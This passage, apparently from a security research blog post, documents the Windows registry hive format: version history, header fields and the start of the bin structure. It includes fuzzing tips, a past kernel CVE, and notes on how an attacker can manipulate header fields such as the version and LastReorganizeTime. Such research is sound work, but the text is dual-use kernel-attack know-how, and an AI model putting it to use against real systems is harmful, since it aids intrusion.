 &lt;p class=&quot;MvcjwGOuIU-c24&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c9 MvcjwGOuIU-c14&quot;&gt;New features&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c72&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c53 MvcjwGOuIU-c67&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c21&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;1.0&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c79 MvcjwGOuIU-c53&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c21&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;1992&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c58 MvcjwGOuIU-c53&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c24&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Windows NT 3.1 Pre-Release&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c55 MvcjwGOuIU-c53&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c24&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Initial format&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c72&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c67 MvcjwGOuIU-c53&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c21&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;1.1&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c79 MvcjwGOuIU-c53&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c21&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;1993&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c53 MvcjwGOuIU-c58&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c24&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Windows NT 3.1&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c53 MvcjwGOuIU-c55&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c24 MvcjwGOuIU-c11&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c72&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c53 MvcjwGOuIU-c75&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c21&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;1.2&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c53 MvcjwGOuIU-c89&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c21&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;1994&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c53 MvcjwGOuIU-c87&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c24&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Windows NT 3.5&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c53 MvcjwGOuIU-c65&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c24&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Predefined keys&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c63 MvcjwGOuIU-c69&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c21&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;1.3&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c63 MvcjwGOuIU-c82&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c21&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;1995&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c62&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c24&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Windows NT 4.0&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c63 MvcjwGOuIU-c76&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c24&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Fast leaves&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c67 MvcjwGOuIU-c59&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c21&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;1.4&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c79 MvcjwGOuIU-c59&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c21&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;2000&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c58 MvcjwGOuIU-c59&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c24&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Windows Whistler Beta 1&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c55 MvcjwGOuIU-c59&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c24&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Big value support&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c4&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c67 MvcjwGOuIU-c63&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c21&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;1.5&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c56&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c21&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;2001&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c58 MvcjwGOuIU-c63&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c24&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Windows XP&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c55 MvcjwGOuIU-c63&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c24&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Hash leaves&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class=&quot;MvcjwGOuIU-c81&quot;&gt;&lt;td class=&quot;MvcjwGOuIU-c67 MvcjwGOuIU-c63&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c21&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;1.6&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c56&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c21&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;2016&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c58 MvcjwGOuIU-c63&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c24&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Windows 10 Anniversary Update&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;td class=&quot;MvcjwGOuIU-c55 MvcjwGOuIU-c63&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;MvcjwGOuIU-c24&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Layered keys&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;The later versions draw extensively on the earlier ones both conceptually and in terms of the actual implementation &amp;ndash; there are non-trivial portions of code in Windows NT 3.1 Beta that are used to this day in the latest Windows 11. But when it comes to pure binary compatibility, versions 1.0 to 1.2 differ too much from the newer ones and have long been considered obsolete. This leaves us with versions &amp;ge; 1.3, which are all cross-compatible and can be used freely on the current systems. Within this group, version 1.4 was an intermediate step in the development of the format, observed only in beta releases of Windows XP (codenamed Whistler). The other three are all in active use, and can be found in a default installation of Windows 10 and 11:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style=&quot;padding: 0;&quot; class=&quot;lst-kix_si5ikxnlj1q7-0 start&quot;&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c15&quot;&gt;1.3:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;encodes volatile hives (the root hive, HKLM\HARDWARE), the BCD hive (HKLM\BCD00000000), the user classes hives (HKU\&amp;lt;SID&amp;gt;_Classes), and some application hives (backed by settings.dat).&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c15&quot;&gt;1.5:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;encodes a majority of the system hives in HKLM (SYSTEM, SOFTWARE, SECURITY, SAM, DRIVERS), all user hives (HKU\&amp;lt;SID&amp;gt;), and most application hives (backed by ActivationStore.dat).&lt;/span&gt;&lt;/li&gt;&lt;li style=&quot;margin-left: 46pt;&quot; class=&quot;c2 c16 c12 li-bullet-0&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c15&quot;&gt;1.6:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;encodes all differencing hives, i.e. hives used by processes running inside Application and Server Silos, mounted under \Registry\WC.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;It is worth noting that the hive version is supposed to be indicative of the features used inside; for example, only hives with versions &amp;ge;1.4 should use big values (values longer than 1 MiB), only hives with versions &amp;ge;1.5 should use hash leaves, etc. However, this is not actually enforced when loading a hive, and newer features being used in older hives will work completely fine. This behavior may become a problem if any part of the registry code makes any assumptions about the structure of the hive based solely on its version. One example of such a vulnerability was &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://project-zero.issues.chromium.org/issues/42451465&quot;&gt;CVE-2022-38037&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;, caused by the fact that the CmpSplitLeaf kernel function determined the format of a subkey list based on the hive version and not the binary representation of the list itself. In general, when writing a registry-specific fuzzer, it might be a good idea to flip the minor version between 3-6 to increase the chances of hitting some interesting corner cases related to version handling.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;As a last note, the version number is internally converted to a single 32-bit integer stored in the _HHIVE.Version structure member using the following formula: &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c22&quot;&gt;Minor+(Major*0x1000)-0x1000&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;. In the typical case where the major version is 1, the last two components cancel each other out, e.g. version 1.5 becomes simply &amp;quot;5&amp;quot;. This would be fine, if not for the fact that a major version of 0 is also allowed by HvpGetHiveHeader, in which case the minor version can be any value greater or equal to 3. Furthermore, if the kernel enters the header recovery path (because the hive header is corrupted and needs to be recovered from a .LOG file), then one can set the major/minor fields to completely arbitrary values and they will be accepted, as HvAnalyzeLogFiles doesn&amp;#39;t perform the same strict checks that HvpGetHiveHeader does. Consequently, it becomes possible to spoof the version saved in _HHIVE.Version and have it take virtually any value in the 32-bit range, but I haven&amp;#39;t found any security implications of this behavior, and I&amp;#39;m sharing it simply as a curiosity.&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;MvcjwGOuIU-c18 MvcjwGOuIU-c12&quot; id=&quot;h.81bw5djzdikw&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c19 MvcjwGOuIU-c17&quot;&gt;RootCell&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;This is the cell index (offset in the hive file) of the root key, which marks a starting point for the Configuration Manager to parse the hive tree. The root cell is special in many respects: it is the only one in a hive that doesn&amp;#39;t have a parent, it cannot be deleted or renamed, its name is unused (it is instead referenced by the name of its mount point), and its security descriptor is treated as the head of the security descriptor linked list. While the RootCell member itself has not been directly involved in any bugs I am aware of, it is worth keeping its special properties in mind when doing registry security research.&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;MvcjwGOuIU-c18 MvcjwGOuIU-c12&quot; id=&quot;h.ya5jqounbowf&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c19 MvcjwGOuIU-c17&quot;&gt;Length&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Specifies the cumulative size of all bins in the hive, i.e. its file size minus 4096 (the size of the header). It is limited to 0x7FFFE000, which reflects the ~2 GiB capacity of the hive stable storage (the part of the hive that resides on disk). Combined with another ~2 GiB of volatile space (in-memory hive data that gets erased on reboot), we get a total maximum size of around 4 GiB when both types of storage space are completely maxed out. Incidentally, that&amp;#39;s the same range as a single 32-bit cell index can address.&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;MvcjwGOuIU-c18 MvcjwGOuIU-c12&quot; id=&quot;h.c3a4a2cpx36f&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c19 MvcjwGOuIU-c17&quot;&gt;Flags&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;There are currently only two supported hive flags: 0x1, which indicates whether there are any pending transactions involving the hive, and 0x2, which expresses whether the hive is &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c10&quot;&gt;differencing&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;and contains layered keys or not. The latter flag is typically set when the hive version is 1.6.&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;MvcjwGOuIU-c18 MvcjwGOuIU-c12&quot; id=&quot;h.15r83x5qhryb&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c19 MvcjwGOuIU-c17&quot;&gt;LastReorganizeTime&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;In order to address the problem of accumulating fragmentation over time, Windows 8.1 introduced a new mechanism to both shrink and optimize hives during load called &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c10&quot;&gt;reorganization&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;. It happens automatically if the last reorganization took place more than seven days ago and the fragmentation rate of the hive is greater than 1 MiB. Reorganization achieves its goals by starting off with an empty hive and copying all existing keys recursively, taking into account which ones have been used during boot, during system runtime, and not at all since the last reorganization. The end result is that the hive becomes more packed, thanks to the elimination of free cells taking up unnecessary space, and more efficient to operate on, because the &amp;quot;hot&amp;quot; keys are grouped closer together.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;As the name suggests, the LastReorganizeTime member stores the timestamp of the last time a successful reorganization took place. From an attacker&amp;#39;s perspective, it can be adjusted to control the behavior of the internal CmpReorganizeHive function and deterministically trigger the reorganization or skip it, depending on the desired end result. In addition to indicating a timestamp, the LastReorganizeTime field may also be equal to one of two special marker values: 0x1 to have the hive unconditionally reorganized on the next load, and 0x2 to clear the access bits on all the keys in the hive, i.e. reset the key usage information that has been collected so far.&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;MvcjwGOuIU-c18 MvcjwGOuIU-c12&quot; id=&quot;h.uxpkiftvp4qy&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c19 MvcjwGOuIU-c17&quot;&gt;CheckSum&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;The CheckSum field at offset 0x1FC stores the checksum of the first 508 bytes of the header (i.e. all data prior to this field), and is simply a 32-bit XOR of the header data treated as a series of 127 consecutive DWORDs. If the computed value is equal to 0xFFFFFFFF (-1), then the checksum is set to 0xFFFFFFFE (-2), and if the computed value is 0x0, then the checksum is 0x1. This means that 0 (all bits clear) and -1 (all bits set) are never valid checksum values. If you wish to examine the kernel implementation of the algorithm, you can find it in the internal HvpHeaderCheckSum function.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c3&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;The checksum is particularly important when making changes to existing hives, either for experimentation or during fuzzing. If any data within the first 508 bytes of the file is modified, the checksum needs to be adjusted accordingly. Otherwise, the system will reject the file early in the loading process with the STATUS_REGISTRY_CORRUPT error code, and none of the deeper code paths will be exercised. Therefore, fixing up the checksum is the bare minimum a hive fuzzer should do to maximize its chances of success.&lt;/span&gt;&lt;/p&gt;&lt;h4 class=&quot;MvcjwGOuIU-c18 MvcjwGOuIU-c12&quot; id=&quot;h.a53oehli1bab&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c19 MvcjwGOuIU-c17&quot;&gt;Other fields&lt;/span&gt;&lt;/h4&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span&gt;There are several other pieces of information in the header that carry some value, more so in the context of digital forensics and incident response than strictly low-level system security. For example, &amp;quot;Signature&amp;quot; identifies the file as a regf hive and may make it easier to identify the format in raw memory/disk dumps, while &amp;quot;TimeStamp&amp;quot; indicates the last time the hive has been written to, which can be critical for establishing a timeline of events during an investigation. Furthermore, the &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c8&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/devnotes/offline-registry-library-portal&quot;&gt;Offline Registry Library&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&amp;nbsp;(offreg.dll) leaves further traces in the generated hive files: a 4-byte &amp;quot;OfRg&amp;quot; identifier at offset 0xB0 (nominally the Reserved1 field) and a serialization timestamp at offset 0x200 (nominally Reserved2). For more information about the meaning and usefulness of each part of the header, please refer to one of the unofficial format specifications.&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;MvcjwGOuIU-c57 MvcjwGOuIU-c12&quot; id=&quot;h.1ct9gr1fo2i7&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c54 MvcjwGOuIU-c17&quot;&gt;Bins&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;MvcjwGOuIU-c2 MvcjwGOuIU-c12&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;Bins in registry hives are a simple organizational concept used to split a potentially large hive into smaller chunks that can be mapped in memory independently of each other. Each of them starts with a 32-byte _HBIN structure:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5 MvcjwGOuIU-c11&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span&gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;0:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;kd&amp;gt;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;dt&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;_HBIN&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;nt!_HBIN&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x000&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Signature&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x004&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;FileOffset&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x008&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Size&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x00c&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Reserved1&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;[2]&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;MvcjwGOuIU-c5&quot;&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;+0x014&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;TimeStamp&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c7&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;MvcjwGOuIU-c1&quot;&gt;_LARGE_INTEGER&lt;/span&gt;&lt;/p&gt;
